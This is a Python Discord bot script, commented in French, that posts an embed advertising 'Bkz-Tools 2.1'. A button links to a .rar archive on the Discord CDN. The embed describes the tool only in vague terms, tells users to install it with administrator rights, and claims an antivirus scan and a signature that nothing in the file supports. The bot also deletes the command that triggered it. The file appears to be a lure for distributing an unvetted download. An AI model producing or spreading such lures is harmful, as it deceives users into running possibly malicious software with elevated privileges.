import discord
import os
from discord.ui import Button, View
from discord.ext import commands

# Configuration du bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')


class DownloadView(View):
    def __init__(self):
        super().__init__(timeout=None)
        
        # Bouton de téléchargement en rouge personnalisé
        download_button = Button(
            label="Télécharger Bkz-Tools 2.1",
            style=discord.ButtonStyle.danger,  # Rouge
            url="https://cdn.discordapp.com/attachments/1486387022582120552/1487794671035093033/Bkz-Tools_2.1.rar?ex=69ca7043&is=69c91ec3&hm=5d3d979b3c3d187148bc4d5faec46d7a9d02b1f20e333094476aefabc9d0c6e6",
            emoji="💾"
        )
        
        self.add_item(download_button)

@bot.event
async def on_ready():
    print(f'{bot.user} est connecté à Discord !')
    print(f'Le bot est prêt à être utilisé sur {len(bot.guilds)} serveur(s)')

@bot.command(name='sendd')
async def send_embed(ctx):
    # Création de l'embed rouge (#FF0000)
    embed = discord.Embed(
        title="📦 **Bkz-Tools 2.1**",
        description="**Tool puissant pour vos besoins quotidiens**\n\n"
                   "**Fonctionnalités :**\n"
                   "• Interface intuitive\n"
                   "• Performances optimisées\n"
                   "• Compatible Windows 10/11\n\n"
                   "**Note :** Assurez-vous d'avoir les droits d'administration pour l'installation.",
        color=0xFF0000  # Rouge #FF0000
    )
    
    # Ajout d'informations supplémentaires
    embed.add_field(name="**Version**", value="`2.1`", inline=True)
    embed.add_field(name=" **Taille**", value="`~40 MB`", inline=True)
    embed.add_field(name="**Dernière mise à jour**", value="`29/03/2026`", inline=True)
    embed.add_field(name="**Sécurité**", value="✓ Scan antivirus ✓ Signé", inline=False)
    
    # Ajout d'un footer
    embed.set_footer(text="Cliquez sur le bouton ci-dessous pour télécharger", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
    
    # Nouvelle image thumbnail
    embed.set_thumbnail(url="https://i.postimg.cc/mDQTcjKF/pixverse-i2i-ori-ed925515-9d7e-4f2a-b6de-ea509125abc2.jpg")
    
    # Création de la vue avec le bouton
    view = DownloadView()
    
    # Envoi du message avec embed et bouton
    await ctx.send(embed=embed, view=view)
    
    # Supprime la commande .sendd
    await ctx.message.delete()

# Token du bot
bot.run(DISCORD_TOKEN)
